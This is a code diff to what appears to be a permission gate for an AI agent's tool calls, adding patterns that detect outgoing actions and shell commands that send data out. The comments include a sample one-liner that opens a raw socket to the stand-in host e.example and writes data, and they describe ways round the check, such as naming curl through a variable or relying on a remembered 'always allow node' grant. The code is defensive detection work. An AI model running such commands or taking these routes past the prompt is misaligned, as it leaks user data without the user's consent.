@@ -16,7 +16,9 @@
 // 1.5.55 (the verifier's second 1.5.54 round): GitHub's pull requests and pushed files, and chat
 // tools' writes (write_message, chat_update, edit_message, add_member) go out too. A Notion page or
 // database item stays the user's own document, as before; so does a local file tool's write_file.
-const SEND_WORDS = /(^|[._-])(send|post|reply|publish|comment|tweet|repost|quote|forward|email|notify|broadcast|dm|share|upload|invite|submit|push|messages?[._-](create|reply|send|update|edit)|create[._-](message|post|comment|tweet|issue|reply|review|gist|discussion|event|pull[._-]request|pr|release|or[._-]update[._-]file)|update[._-](post|issue|comment|message|pull[._-]request)|merge[._-](pull[._-]request|pr)|(write|edit)[._-]message|chat[._-](update|send|post[._-]?message)|add[._-](member|collaborator|participant|user)s?)($|[._-])/i;
+const SEND_WORDS = /(^|[._-])(send|post|reply|publish|comment|tweet|repost|quote|forward|email|notify|broadcast|dm|share|upload|invite|submit|push|messages?[._-](create|reply|send|update|edit)|create[._-](message|post|comment|tweet|issue|reply|review|gist|discussion|event|pull[._-]request|pr|release|or[._-]update[._-]file)|update[._-](post|issue|comment|message|pull[._-]request)|merge[._-](pull[._-]request|pr)|(write|edit)[._-]message|chat[._-](update|send|post[._-]?message)|add[._-](member|collaborator|participant|user)s?|assign|assignees?|add[._-](issue[._-])?assignees?|request[._-]reviewers?|request[._-](copilot[._-])?reviews?)($|[._-])/i;
+// 1.5.63 (the verifier's §9 very-low list): assigning someone to an issue and asking for reviewers
+// notify those people - sends too (assign_issue, add_issue_assignees, request_reviewers).
 const NOT_SEND = /(^|[._-])(get|list|search|read|fetch|query|find|lookup|describe|show|view|retrieve|count|draft_list)($|[._-])/i;
 /** Keys that hold what is said (the body of a post or a message). */
 const TEXT_KEY = /^(text|content|body|message|msg|comment|reply|caption|title|subject|desc|description|status|note|markdown|html_body|text_body)$/i;
@@ -74,7 +76,18 @@ const COMMAND_SENDS = [
   /\b(curl|wget|iwr|irm|Invoke-WebRequest|Invoke-RestMethod)(\.exe)?\b[^|;&\n]*(\$\(|`|\s@[A-Za-z_]\w*)/i,
   /\burlopen\([^)]*\bdata\s*=|\bRequest\([^)]*\bdata\s*=|\bmethod\s*[:=]\s*['"](POST|PUT|PATCH)['"]/i,
   /\bgh(\.exe)?\s+api\b[^|;&\n]*(\s-X\s*['"]?(POST|PUT|PATCH)\b|\s--method[=\s]+['"]?(POST|PUT|PATCH)\b|\s-[fF]\s|\s--(field|raw-field|input)\b)|\bgh(\.exe)?\s+(issue|pr|release|gist|discussion)\s+(create|comment|edit|review|merge|close|reopen)\b/i,
+  // 1.5.63 (the verifier's §9): Node, Deno and Bun opening raw connections in code on the line
+  // (node -e "require('net').connect(80,'e.example').write(d)"), like Python's socket above - a
+  // remembered 「以后都允许 node」 no longer lets it through.
+  /\brequire\(\s*['"](node:)?(net|tls|dgram)['"]\s*\)|\bfrom\s+['"](node:)?(net|tls|dgram)['"]|\bimport\(\s*['"](node:)?(net|tls|dgram)['"]\s*\)|\b(net|tls)\.(connect|createConnection)\s*\(|\bnew\s+net\.Socket\b|\bdgram\.createSocket\b|\bDeno\.(connect|connectTls|listenDatagram)\s*\(|\bBun\.(connect|udpSocket)\s*\(/,
 ];
+
+/**
+ * 1.5.63 (the verifier's §9): a program named through a variable (`set c=curl & %c% -d … https://…`,
+ * `$c -d … https://…`, `& $c …`, eval / Invoke-Expression) cannot be told apart from curl here:
+ * with an address on the line that is not this machine's, it counts as sending.
+ */
+const VIA_VARIABLE = /(^|[;&|(\n]|\b(?:do|then|else|cmd(?:\.exe)?\s+\/[a-z]|start(?:\s+\/b)?)\s)\s*["']?(?:%[A-Za-z_][\w]*(?::[^%]*)?%|![A-Za-z_]\w*!|\$\{?[A-Za-z_]\w*\}?|&\s*["']?\$\{?[A-Za-z_]\w*\}?)(?=[\s"']|$)|(^|[\s;&|(])(eval|iex|Invoke-Expression)(\s|\(|$)/i;
 const LOCAL_URL = /^https?:\/\/(localhost|127\.\d+\.\d+\.\d+|\[::1\])(:\d+)?(\/|$)/i;
 /** The request can be sent somewhere else than its URL says (a proxy, a forced address): no "local only" pass. */
 const REDIRECTED = /\s--(connect-to|resolve|proxy|preproxy|socks4a?|socks5(-hostname)?|proxy1\.0)\b|\s-x(\s|\S)|\s-Proxy\b|\bHTTPS?_PROXY\s*=|\bALL_PROXY\s*=/i;
@@ -132,6 +145,7 @@ export function outgoingAsk(name, args = {}, { mcp = null } = {}) {
     const raw = String(args?.command || '');
     const command = unescapedCommand(raw);
     if (COMMAND_SENDS.some((re) => re.test(command) || re.test(raw)) && !(onlyLocal(raw) && onlyLocal(command))) return '这条命令会往外发数据（提交内容、上传、连到别的电脑或发邮件），每次都先问你';
+    if ((VIA_VARIABLE.test(command) || VIA_VARIABLE.test(raw)) && /https?:\/\//i.test(command) && !(onlyLocal(raw) && onlyLocal(command))) return '这条命令通过变量运行一个程序，还带着网址，可能往外发数据，每次都先问你';
     // A PowerShell script handed over encoded: what it says decides; one that cannot be read asks.
     const inner = encodedScript(command);
     if (inner !== null && (!inner.trim() || outgoingAsk('shell', { command: inner }))) return '这条命令带着一段编码过的脚本，可能往外发数据，每次都先问你';
